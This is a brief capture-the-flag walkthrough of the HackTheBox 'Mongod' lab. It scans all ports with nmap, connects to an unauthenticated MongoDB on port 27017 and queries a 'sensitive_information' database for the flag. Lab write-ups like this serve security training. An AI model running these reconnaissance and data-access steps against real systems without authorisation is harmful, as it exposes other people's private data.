---
title: Walkthough - A HackTheBox machine - Mongod 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
  - mongodb
  - port 27017
---

# Walkthrough - A HackTheBox machine - Mongod

Enumerate open services/ports:

```bash
nmap -sC -sV $ip -Pn -p-
```

Ports 22 and 27017 are open. 

```bash
mongo IP:port
# in my case: mongo 10.129.228.30:27017 
```

Now, use [mongodb cheat sheet](27017-27018-mongodb.md) to browse the databases:

```mongo
show databases
use sensitive_information
show collections
db.flag.find()
```




